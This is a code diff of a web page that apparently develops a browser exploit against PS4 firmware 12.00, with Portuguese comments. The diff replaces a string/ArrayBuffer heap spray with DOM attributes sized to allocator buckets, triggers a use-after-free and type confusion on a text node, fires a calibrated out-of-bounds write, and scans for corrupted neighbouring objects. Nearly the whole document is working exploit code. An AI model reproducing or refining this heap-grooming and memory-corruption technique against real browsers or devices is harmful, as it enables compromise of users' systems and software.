@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - FastMalloc Strike</title>
+<title>PS4 12.00 - Precision Size Class Strike</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → FastMalloc Strike → JSC String/Buffer Scan</h2>
+<h2>UAF → Precision Bucket Strike → Attribute Scan</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -20,32 +20,24 @@ function log(msg){
 }
 
 // ==========================
-// 🌍 FAST-MALLOC SPRAY (AS NOVAS ISCAS)
-// Strings e Buffers costumam ser alocados no mesmo "bairro" que o DOM
-function setupFastMallocSpray(){
-    log("[*] Iniciando FastMalloc Spray (Strings e Buffers)...");
-
-    window.str_spray = [];
-    window.ab_spray = [];
-
+// 🌍 PRECISION SPRAY (ALINHAMENTO DE BUCKETS)
+function setupPrecisionSpray(){
+    log("[*] Iniciando Spray de Precisao (Size Classes)...");
+    
+    window.attr_spray = [];
+    
     for(let i=0; i<6000; i++){
-        // 1. Isca de String JS (Vai para o FastMalloc)
-        // Usamos "B" para contrastar com nosso tiro de "X"
-        window.str_spray.push("BAIT_STR_" + i + "_" + "B".repeat(0x200));
-
-        // 2. Isca de ArrayBuffer (Dados brutos também costumam ir pro FastMalloc)
-        let ab = new ArrayBuffer(0x200);
-        let v = new Uint32Array(ab);
-        v[0] = 0x13371337; // Assinatura
-        v[1] = i;          // ID
-        window.ab_spray.push(v);
+        let d = document.createElement("div");
+        // Isca com exatos 512 caracteres "B" (Bucket de 1024 bytes em UTF-16)
+        d.setAttribute("data-pwn", "B".repeat(512));
+        document.body.appendChild(d);
+        window.attr_spray.push(d);
     }
-
-    log("[*] Spray FastMalloc concluído!");
+    log("[*] Spray de atributos concluido: " + window.attr_spray.length);
 }
 
 // ==========================
-// HEAP SETUP ORIGINAL (100% INALTERADO - Mantém a pressão do bug)
+// HEAP SETUP ORIGINAL (100% INALTERADO - Mantém a estabilidade do bug)
 function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
@@ -102,9 +94,9 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 PROBE DO FASTMALLOC
+// 🔬 PROBE DE PRECISÃO
 function domOverlapProbe(fsTarget){
-    log("---- FASTMALLOC PROBE ----");
+    log("---- PRECISION PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
@@ -113,35 +105,30 @@ function domOverlapProbe(fsTarget){
         if(n.nodeType === 3){
             log("[!!!] TEXTNODE CONFUSION");
 
-            // 💣 DISPARA O TIRO LONGO: Trocamos para "X" para identificar fácil
+            // 💣 DISPARA O TIRO DE PRECISÃO
             try{
-                n.data = "X".repeat(0x1000); 
-                log("[PWN] OOB write disparado (4KB de 'X')");
+                // Tamanho de 512 (preenche o bloco) + 64 (invade o bloco do vizinho)
+                // Usamos "X" para fácil identificação
+                n.data = "X".repeat(512 + 64); 
+                log("[PWN] Overwrite de precisao disparado");
             }catch(e){
                 log("[UAF] write crash");
             }
 
             // ==========================
-            // 🔥 SCANNER DOS INFILTRADOS
+            // 🔥 SCANNER DOS ATRIBUTOS
             try{
-                // 1. Checa se o tiro rasgou alguma String do JS
-                for(let i=0; i<window.str_spray.length; i++){
-                    // Se a string que era cheia de "B" de repente tiver "X", ACERTAMOS!
-                    if(window.str_spray[i].includes("XXXX")){
-                        log("[$$$] FASTMALLOC HIT! JS String corrompida @ " + i);
-                        return;
+                for(let i=0; i<window.attr_spray.length; i++){
+                    let val = window.attr_spray[i].getAttribute("data-pwn");
+                    
+                    // Se o atributo não for mais uma sequência pura de "B"s, ACERTAMOS!
+                    if(val && val.includes("XXXX")){
+                        log("[$$$] JACKPOT FASTMALLOC! Atributo corrompido @ " + i);
+                        log("[$$$] Prévia: " + val.substring(0, 30) + "...");
+                        return; // Achamos o furo, para o scan!
                     }
                 }
-
-                // 2. Checa se o tiro pegou algum ArrayBuffer
-                for(let i=0; i<window.ab_spray.length; i++){
-                    if(window.ab_spray[i][0] !== 0x13371337){
-                        log("[$$$] FASTMALLOC HIT! ArrayBuffer corrompido @ " + i);
-                        return;
-                    }
-                }
-
-                log("[SCAN] Nada atingido (Tiro passou no vazio)");
+                log("[SCAN] Nada atingido neste bucket.");
 
             }catch(e){
                 log("[UAF] scan crash");
@@ -186,11 +173,10 @@ function trigger(fsTarget){
 function runTest(){
     log("[*] Iniciando teste...");
     
-    // Mantém sua pressão de memória intocável
     window.heap_press = setupHeap(); 
 
-    // Planta os nossos espiões na arena do DOM
-    setupFastMallocSpray(); 
+    // Planta as iscas perfeitamente calibradas
+    setupPrecisionSpray(); 
 
     let fsTarget=setupFullscreen();
     window.onblur=function(){
